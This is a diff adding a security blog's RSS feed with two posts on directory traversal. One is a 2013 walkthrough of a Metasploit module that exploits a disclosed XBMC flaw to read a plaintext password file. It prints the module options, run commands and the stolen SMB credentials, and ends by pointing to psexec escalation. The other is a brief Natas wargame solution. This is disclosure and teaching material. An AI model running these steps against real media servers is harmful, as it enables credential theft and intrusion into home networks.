@@ -1,0 +1,164 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Directorytraversal on Matt Andreko</title>
+    <link>https://www.mattandreko.com/categories/directorytraversal/index.xml</link>
+    <description>Recent content in Directorytraversal on Matt Andreko</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en-US</language>
+    <atom:link href="https://www.mattandreko.com/categories/directorytraversal/index.xml" rel="self" type="application/rss+xml" />
+    
+    <item>
+      <title>XBMC Traversal Metasploit Module</title>
+      <link>https://www.mattandreko.com/blog/2013-02-25-xbmc-traversal-metasploit-module/</link>
+      <pubDate>Mon, 25 Feb 2013 15:32:00 -0500</pubDate>
+      
+      <guid>https://www.mattandreko.com/blog/2013-02-25-xbmc-traversal-metasploit-module/</guid>
+      <description>
+
+&lt;h2 id=&#34;background&#34;&gt;Background&lt;/h2&gt;
+
+&lt;p&gt;I was talking in &lt;a href=&#34;irc://chat.freenode.net:6667/intern0t&#34;&gt;Intern0t&lt;/a&gt; several months ago. &lt;a href=&#34;https://twitter.com/Acidgen&#34;&gt;AcidGen&lt;/a&gt;, from &lt;a href=&#34;http://www.ioactive.com&#34;&gt;IOActive&lt;/a&gt; mentioned that he found a bug in &lt;a href=&#34;http://www.xbmc.org&#34;&gt;XBMC&lt;/a&gt;. I use &lt;a href=&#34;http://www.xbmc.org&#34;&gt;XBMC&lt;/a&gt; quite a bit at home, on various platforms, since it&amp;rsquo;s extremely wife-friendly. I hit him up, and we started talking. We had a nice Skype conversation, where we discussed possible platforms that were affected, and future exploits that we&amp;rsquo;d like to find. Since I had a jailbroken &lt;a href=&#34;https://www.apple.com/appletv&#34;&gt;Apple TV 2&lt;/a&gt; and &lt;a href=&#34;http://www.raspberrypi.org&#34;&gt;RaspberryPi&lt;/a&gt;, I told him that I could test those platforms and help out.&lt;/p&gt;
+
+&lt;!-- more --&gt;
+
+&lt;p&gt;An &lt;a href=&#34;http://www.ioactive.com/pdfs/Security_Advisory_XBMC.pdf&#34;&gt;official disclosure&lt;/a&gt; was released, detailing the directory traversal vulnerability. The &lt;a href=&#34;http://www.xbmc.org&#34;&gt;XBMC&lt;/a&gt; team was able to make a &lt;a href=&#34;https://github.com/xbmc/xbmc/commit/bdff099c024521941cb0956fe01d99ab52a65335&#34;&gt;fix&lt;/a&gt;, and the new version 12 is not vulnerable.&lt;/p&gt;
+
+&lt;h2 id=&#34;why-does-this-vulnerability-matter&#34;&gt;Why does this vulnerability matter?&lt;/h2&gt;
+
+&lt;p&gt;When talking with the &lt;a href=&#34;http://www.xbmc.org&#34;&gt;XBMC&lt;/a&gt;, they seemed to play off the vulnerability, because they believed nobody would ever expose this service to a public network. However, a quick &lt;a href=&#34;http://www.shodanhq.com/search?q=xbmc&#34;&gt;ShodanHQ&lt;/a&gt; search shows that people are exposing it. But you may say, &amp;ldquo;Matt, this is only a directory traversal vulnerability, what are you going to do, steal someone&amp;rsquo;s MP3s?&amp;rdquo;. The issue here, lies in that if you can read any file on the system, that may include password files, such as /etc/passwd or even /etc/shadow if the service runs as root. What makes this even worse, is that due to how XBMC has to pass credentials to a fileserver, it stores the credentials in plain text. This gives an attacker a &lt;i&gt;huge&lt;/i&gt; advantage. They now have valid credentials on at least one system. If the system has SMB exposed as well, it could easily be game-over.&lt;/p&gt;
+
+&lt;h2 id=&#34;let-s-see-the-exploit&#34;&gt;Let&amp;rsquo;s see the exploit&amp;hellip;&lt;/h2&gt;
+
+&lt;p&gt;I don&amp;rsquo;t know why it took so long, but I finally finished the MSF module for this vulnerability. It can be found &lt;a href=&#34;https://github.com/rapid7/metasploit-framework/blob/master/modules/auxiliary/gather/xbmc_traversal.rb&#34;&gt;here&lt;/a&gt;. The usage is pretty simple. Here is a sample exploitation against an &lt;a href=&#34;https://www.apple.com/appletv&#34;&gt;Apple TV 2&lt;/a&gt;.&lt;/p&gt;
+
+&lt;p&gt;As usual, watch the pretty ASCII-art go by, and use the module.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;420-1572-man:gather mandreko$ msfconsole
+     ,           ,
+    /             \
+   ((__---,,,---__))
+      (_) O O (_)_________
+         \ _ /            |\
+          o_o \   M S F   | \
+               \   _____  |  *
+                |||   WW|||
+                |||     |||
+
+
+       =[ metasploit v4.6.0-dev [core:4.6 api:1.0]
++ -- --=[ 1048 exploits - 590 auxiliary - 174 post
++ -- --=[ 275 payloads - 28 encoders - 8 nops
+
+msf &amp;gt; use auxiliary/gather/xbmc_traversal
+msf  auxiliary(xbmc_traversal) &amp;gt;
+&amp;lt;/pre&amp;gt;Check out the options. You&#39;ll see the username and password that need to be set (however it&#39;s often defaulted to &amp;quot;xbmc&amp;quot;, as well as the host, and file to disclose. 
+&amp;lt;pre&amp;gt;msf  auxiliary(xbmc_traversal) &amp;gt; show options
+
+Module options (auxiliary/gather/xbmc_traversal):
+
+   Name      Current Setting                                                      Required  Description
+   ----      ---------------                                                      --------  -----------
+   DEPTH     9                                                                    yes       The max traversal depth
+   FILEPATH  /private/var/mobile/Library/Preferences/XBMC/userdata/passwords.xml  no        The name of the file to download
+   PASSWORD  xbmc                                                                 yes       The password to use for the HTTP server
+   Proxies                                                                        no        Use a proxy chain
+   RHOST                                                                          yes       The target address
+   RPORT     8080                                                                 yes       The target port
+   USERNAME  xbmc                                                                 yes       The username to use for the HTTP server
+   VHOST                                                                          no        HTTP server virtual host
+
+msf  auxiliary(xbmc_traversal) &amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Go ahead and set the RHOST to the XBMC server.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;msf  auxiliary(xbmc_traversal) &amp;gt; set rhost 192.168.1.102
+rhost =&amp;gt; 192.168.1.102
+msf  auxiliary(xbmc_traversal) &amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Lastly, run the exploit&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;msf  auxiliary(xbmc_traversal) &amp;gt; run
+
+[+] File saved in: /Users/mandreko/.msf4/loot/20130223100731_default_192.168.1.102_xbmc.http_604967.xml
+[*] Auxiliary module execution completed
+msf  auxiliary(xbmc_traversal) &amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;You can see this was successful. It saved the file locally, and added notes in &lt;a href=&#34;http://www.metasploit.com&#34;&gt;Metasploit&lt;/a&gt;. Just to verify the findings, you can read the file it saved.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;msf  auxiliary(xbmc_traversal) &amp;gt; cat /Users/mandreko/.msf4/loot/20130223100731_default_192.168.1.102_xbmc.http_604967.xml
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;pre&gt;&lt;code&gt;[*] exec: cat /Users/mandreko/.msf4/loot/20130223100731_default_192.168.1.102_xbmc.http_604967.xml
+
+&amp;lt;passwords&amp;gt;
+    &amp;lt;path&amp;gt;
+        &amp;lt;from pathversion=&amp;quot;1&amp;quot;&amp;gt;smb://192.168.1.2/Movies&amp;lt;/from&amp;gt;
+        &amp;lt;to pathversion=&amp;quot;1&amp;quot;&amp;gt;smb://xbmc:xbmc@192.168.1.2/Movies/&amp;lt;/to&amp;gt;
+    &amp;lt;/path&amp;gt;
+    &amp;lt;path&amp;gt;
+        &amp;lt;from pathversion=&amp;quot;1&amp;quot;&amp;gt;smb://192.168.1.2/tv&amp;lt;/from&amp;gt;
+        &amp;lt;to pathversion=&amp;quot;1&amp;quot;&amp;gt;smb://xbmc:xbmc@192.168.1.2/tv/&amp;lt;/to&amp;gt;
+    &amp;lt;/path&amp;gt;
+    &amp;lt;path&amp;gt;
+        &amp;lt;from pathversion=&amp;quot;1&amp;quot;&amp;gt;smb://192.168.1.2/Music&amp;lt;/from&amp;gt;
+        &amp;lt;to pathversion=&amp;quot;1&amp;quot;&amp;gt;smb://xbmc:xbmc@192.168.1.2/Music/&amp;lt;/to&amp;gt;
+    &amp;lt;/path&amp;gt;
+&amp;lt;/passwords&amp;gt;
+msf  auxiliary(xbmc_traversal) &amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;And there you have it. You now have valid credentials on that fileserver. You could start escalating with psexec or other methods. Half the battle is already over.&lt;/p&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>OverTheWire Natas Level 7</title>
+      <link>https://www.mattandreko.com/blog/2012-11-06-overthewire-natas-level-7/</link>
+      <pubDate>Tue, 06 Nov 2012 05:32:00 -0500</pubDate>
+      
+      <guid>https://www.mattandreko.com/blog/2012-11-06-overthewire-natas-level-7/</guid>
+      <description>&lt;p&gt;Finally, with level 7 of OverTheWire&amp;rsquo;s Natas wargame, we start to get to more &amp;ldquo;real world&amp;rdquo; vulnerabilities. It&amp;rsquo;s still very easy, but it&amp;rsquo;s at least getting better.&lt;/p&gt;
+
+&lt;!-- more --&gt;
+
+&lt;p&gt;We start with a single page, that has 2 navigation links.&lt;/p&gt;
+
+
+&lt;figure class=&#34;img-responsive&#34;&gt;
+    
+        &lt;img src=&#34;https://www.mattandreko.com/img/natas7_1.png&#34; /&gt;
+    
+    
+&lt;/figure&gt;
+
+
+&lt;p&gt;I noted that the URLs had a &amp;ldquo;page=&amp;rdquo; parameter. I thought maybe this would be the file it was including. Viewing the source gave a nice reminder of where the password for the next level would be stored.&lt;/p&gt;
+
+
+&lt;figure class=&#34;img-responsive&#34;&gt;
+    
+        &lt;img src=&#34;https://www.mattandreko.com/img/natas7_2.png&#34; /&gt;
+    
+    
+&lt;/figure&gt;
+
+
+&lt;p&gt;I then tried a directory traversal exploit, pointing to the password file for the next level. It successfully displayed the password.&lt;/p&gt;
+
+
+&lt;figure class=&#34;img-responsive&#34;&gt;
+    
+        &lt;img src=&#34;https://www.mattandreko.com/img/natas7_3.png&#34; /&gt;
+    
+    
+&lt;/figure&gt;
+
+</description>
+    </item>
+    
+  </channel>
+</rss>
